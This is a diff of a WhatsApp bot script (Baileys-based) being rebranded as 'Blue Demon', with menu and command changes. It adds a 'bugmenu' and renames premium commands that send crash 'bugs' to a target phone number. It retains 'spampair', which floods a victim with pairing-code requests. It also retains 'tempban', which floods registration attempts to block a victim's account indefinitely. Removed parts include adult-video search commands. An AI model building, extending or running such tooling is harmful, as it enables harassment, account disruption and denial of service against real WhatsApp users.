@@ -898,20 +898,6 @@ END:VCARD`
 │ ⑄ ᴀɴɢʀʏ
 │ ⑄ ᴄᴏɴꜰᴜꜱᴇ
 ┗─────────────❐
-
-┏─『 \`𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
-│ ⑄ ᴡʀɪᴛᴇᴛᴇxᴛ 
-│ ⑄ ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ
-│ ⑄ ɢʟɪᴛᴄʜ
-│ ⑄ ᴘɪxᴇʟɢʟɪᴛᴄʜ
-│ ⑄ ꜰʟᴀɢᴛᴇxᴛ
-│ ⑄ ɢʟᴏᴡɪɴɢᴛᴇxᴛ
-│ ⑄ ʟᴏɢᴏᴍᴀᴋᴇʀ
-│ ⑄ ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ
-│ ⑄ ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ
-│ ⑄ 
-│ ⑄ 
-┗─────────────❐
 `;
 
                 let listMessage = {
@@ -985,6 +971,83 @@ END:VCARD`
 │ ⑄ ᴀɴᴛɪʙᴜɢᴏꜰꜰ 
 │ ⑄ ꜱᴘᴀᴍᴘᴀɪʀ
 │ ⑄ ʙᴀɴɴᴜᴍ
+┗─────────────❐
+
+`;
+
+                let listMessage = {
+                    title: '𝗠𝗘𝗡𝗨͖',
+                    buttonText: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
+                    sections: []
+                };
+
+                let freesex = generateWAMessageFromContent(m.chat, {
+                    viewOnceMessage: {
+                        message: {
+                            messageContextInfo: {
+                                deviceListMetadata: {},
+                                deviceListMetadataVersion: 2
+                            },
+                            interactiveMessage: proto.Message.InteractiveMessage.create({
+                                contextInfo: {
+                                    mentionedJid: [m.sender],
+                                    externalAdReply: {
+                                        showAdAttribution: true
+                                    }
+                                },
+                                body: proto.Message.InteractiveMessage.Body.create({
+                                    text: allmenu
+                                }),
+                                footer: proto.Message.InteractiveMessage.Footer.create({
+                                    text: ''
+                                }),
+                                header: proto.Message.InteractiveMessage.Header.create({
+                                    hasMediaAttachment: true,
+                                    ...(await prepareWAMessageMedia({
+                                        image: await fs.readFileSync("./database/image/xbug.jpg")
+                                    }, {
+                                        upload: zyn.waUploadToServer
+                                    }))
+                                }),
+                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                    buttons: [{
+                                        "name": "cta_url",
+                                        "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
+                                    }]
+                                })
+                            })
+                        }
+                    }
+                }, {
+                    userJid: m.sender,
+                    quoted: m
+                });
+
+                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
+                    messageId: freesex.key.id
+                });
+            }
+            break;
+            
+            case 'bugmenu': {
+                const version = require("baileys/package.json").version;
+                let run = runtime(process.uptime());
+
+                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
+┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
+┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
+┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
+┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
+┗━━━━━━━━━━━━━━━━━━❐
+
+┏─『 \`𝐁𝐔𝐆𝐌𝐄𝐍𝐔\` 』
+│ ⑄ ʙʟᴜᴇᴅɪᴅ
+│ ⑄ ʙʟᴜᴇꜱᴀʏꜱ
+│ ⑄ ʜᴇʜᴇ
+│ ⑄ ɴɪɢʜᴛʏ
+│ ⑄ xɪᴏꜱ
+│ ⑄ ᴏᴠᴇʀꜰʟᴏᴡ 
 ┗─────────────❐
 
 `;
@@ -2392,81 +2455,6 @@ END:VCARD`
                 setTimeout(() => updateMessage(), 1000);
                 break;
             }
-            case 'glitchtext':
-            case 'writetext':
-            case 'advancedglow':
-            case 'typographytext':
-            case 'pixelglitch':
-            case 'neonglitch':
-            case 'flagtext':
-            case 'flag3dtext':
-            case 'deletingtext':
-            case 'blackpinkstyle':
-            case 'glowingtext':
-            case 'underwatertext':
-            case 'logomaker':
-            case 'cartoonstyle':
-            case 'papercutstyle':
-            case 'watercolortext':
-            case 'effectclouds':
-            case 'blackpinklogo':
-            case 'gradienttext':
-            case 'summerbeach':
-            case 'luxurygold':
-            case 'multicoloredneon':
-            case 'sandsummer':
-            case 'galaxywallpaper':
-            case '1917style':
-            case 'makingneon':
-            case 'royaltext':
-            case 'freecreate':
-            case 'galaxystyle':
-            case 'lighteffects': {
-
-                if (!q) return reply(`Example : ${prefix+command} BLUE DEMON`)
-                bluereply(mess.wait)
-                let link
-                if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
-                if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
-                if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
-                if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
-                if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
-                if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
-                if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
-                if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
-                if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
-                if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
-                if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
-                if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
-                if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
-                if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
-                if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
-                if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
-                if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
-                if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
-                if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
-                if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
-                if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
-                if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
-                if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
-                if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
-                if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
-                if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
-                if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
-                if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
-                if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
-                if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
-                let haldwhd = await ephoto(link, q)
-                zyn.sendMessage(m.chat, {
-                    image: {
-                        url: haldwhd
-                    },
-                    caption: `*SUCCESS BY BLUEDEMON*`
-                }, {
-                    quoted: m
-                })
-            }
-            break
             
             case 'spampair': {
                 const usePairingCode = true
@@ -2476,7 +2464,7 @@ END:VCARD`
                 if (!q) return reply(`*👾*\n\n*_Use : Spampair NUMBER*|AMOUNT_\n_Example : Spampair 62xx_`)
                 let [peenis, pepekk = "200"] = q.split("|")
                 await reply(`👾𝙎𝙋𝘼𝙈 𝘾𝙊𝘿𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👾`)
-                await reaction(m.chat, "✅")
+             
                 let target = peenis.replace(/[^0-9]/g, '').trim()
                 let {
                     default: makeWaSocket,
@@ -2514,16 +2502,16 @@ END:VCARD`
 
 
             case 'tempban': {
-                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                if (!isOwner) return reply(mess.only.owner)
                 if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
-                if (!/|/.test(text)) return reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
+                if (!/|/.test(text)) return reply(`The data you provided is invalid!, Example: \n ${command} 62|8xxx`)
                 let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))
 
                 let cCode = q.split("|")[0]
                 let number = q.split("|")[1]
                 let fullNo = cCode + number
 
-                await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
+                await reply(`❗ Success! Registration Disturbance has been successfully activated to the target : ${fullNo} use ${command} indefinitely ✅. Registration interruption will be stopped if the server is restarted, turned off, or down Ⓜ️.`)
 
                 let {
                     state,
@@ -2548,7 +2536,7 @@ END:VCARD`
                         })
 
                         if (res.reason === 'temporarily_unavailable') {
-                            console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
+                            console.log(`Invalid Number (Possibly Registration Interrupted): +${res.login}`)
                             await sleep(1000)
                             await dropNumber()
                         }
@@ -2570,23 +2558,19 @@ END:VCARD`
 
 
             case 'antibugon': {
-                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                if (!isOwner) return reply(mess.only.owner)
                 global.antibug = true
-                return reply('sukses mengaktifkan antibug')
+                return reply('*ANTIBUG ACTIVATED*')
             }
             break
 
             case 'antibugoff': {
-                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                if (!isOwner) return reply(mess.only.owner)
                 global.antibug = false
-                return reply('sukses menonaktifkan antibug')
+                return reply('*ANTIBUG DEACTIVATED*')
             }
             break
-
-           
-
-            case 'stuk':
-            case 'flow':
+           case 'hehe':
                 if (!isPremium) return reply(mess.only.premium)
                 if (!q) return reply(`Example: ${prefix + command} 62×××`)
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
@@ -2602,8 +2586,7 @@ END:VCARD`
                 reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
                 break
 
-            case 'fuck':
-            case 'tzy':
+            case 'bluesays':
                 if (!isPremium) return reply(mess.only.premium)
                 if (!q) return reply(`Example: ${prefix + command} 62×××`)
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
@@ -2619,9 +2602,7 @@ END:VCARD`
                 reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
                 break
 
-            case 'vip':
-            case 'attack':
-            case 'andro':
+            case 'bluedid':
                 if (!isPremium) return reply(mess.only.premium)
                 if (!q) return reply(`Example: ${prefix + command} 62×××`)
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
@@ -2638,7 +2619,6 @@ END:VCARD`
                 break
 
             case 'xios':
-            case 'iphone':
             case 'xip':
                 if (!isPremium) return reply(mess.only.premium)
                 if (!q) return reply(`Example: ${prefix + command} 62×××`)
@@ -2684,21 +2664,21 @@ END:VCARD`
                         highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                         rows: [{
                             title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
-                            id: `vip ${target}`
+                            id: `hehe ${target}`
                         }]
                     },
                     {
                         highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                         rows: [{
                             title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
-                            id: `andro ${target}`
+                            id: `bluedid ${target}`
                         }]
                     },
                     {
                         highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                         rows: [{
                             title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
-                            id: `attack ${target}`
+                            id: `boom ${target}`
                         }]
                     },
                     {
@@ -2764,7 +2744,7 @@ END:VCARD`
                                     isForwarded: true,
                                     forwardedNewsletterMessageInfo: {
                                         newsletterJid: "0@newsletter",
-                                        newsletterName: 'Powered By JackTzy',
+                                        newsletterName: 'Powered By Demon king',
                                         serverMessageId: -1
                                     },
                                     businessMessageForwardInfo: {
@@ -2793,7 +2773,7 @@ END:VCARD`
                                         "buttonParamsJson": JSON.stringify(listMessage)
                                     }, {
                                         "name": "cta_url",
-                                        "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
+                                        "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\"}"
                                     }, ]
                                 })
                             })
@@ -2855,110 +2835,9 @@ END:VCARD`
 
 
 
-            case 'xnxxsearch': {
-                if (!text) return m.reply(`Kirim Judul Bokep`)
-                try {
-                    const fg = require('api-dylux')
-                    let res = await fg.xnxxSearch(text)
-                    m.reply(mess.wait)
-                    let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
-                    if (res.status) m.reply(ff)
+            
 
-                } catch (error) {
-                    console.error(error);
-                    m.reply('Yah Error');
-                }
-            }
-            break
-            case 'xnxxdl': {
-                if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
-                if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
-                try {
-                    m.reply(mess.wait)
-                    const fg = require('api-dylux')
-                    let xn = await fg.xnxxdl(text)
-                    let tobatrek = `*XNXX DOWNLOAD*
-        
-▢ *📌Title*: ${xn.title}
-▢ *⌚Duration:* ${xn.duration}
-▢ *🎞️Quality:* ${xn.quality}`
-                    await rioo.replyWithVideo({
-                        url: xn.url_dl,
-                    }, {
-                        caption: tobatrek,
-                    })
-                } catch (error) {
-                    console.error(error);
-                    m.reply('Yah Error');
-                }
-            }
-            break
-
-            case "tts": {
-                if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
-                const a = await (
-                    await axios.post(
-                        "https://gesserit.co/api/tiktok-tts", {
-                            text: text,
-                            voice: "id_001"
-                        }, {
-                            headers: {
-                                Referer: "https://gesserit.co/tiktok",
-                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-                                responseType: "arraybuffer",
-                            },
-                        },
-                    )
-                ).data;
-                const b = Buffer.from(a.audioUrl);
-                zyn.sendMessage(m.chat, {
-                    audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
-                    mimetype: "audio/mpeg",
-                })
-            }
-            break;
-
-            case 'solver': {
-                if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`)
-                await zyn.sendMessage(m.chat, {
-                    react: {
-                        text: "🌚",
-                        key: m.key,
-                    }
-                })
-                if (/image/.test(mime)) {
-                    const media = await sock.downloadAndSaveMediaMessage(quoted)
-                    let anuu = await pomfCDN(media)
-                    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
-                    const aimsg = data.result;
-                    m.reply(`${aimsg}`)
-                }
-            }
-            break
-
-            case 'removebg':
-                //if (isBan) return m.reply(mess.ban)
-                if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
-                if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
-                if (/image/.test(mime)) {
-                    m.reply(mess.wait)
-                    let mee = await m.downloadAndSaveMediaMessage(quoted)
-                    let mem = await shannzCdn(mee)
-                    let url = mem.result.url;
-                    let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
-                    let bg = shannz.result.image
-                    zyn.sendMessage(m.chat, {
-                        image: {
-                            url: bg
-                        },
-                        caption: '*SUCCESS* ✅'
-                    }, {
-                        quoted: m
-                    })
-                }
-                break
-
-
+            
 
 
             default:
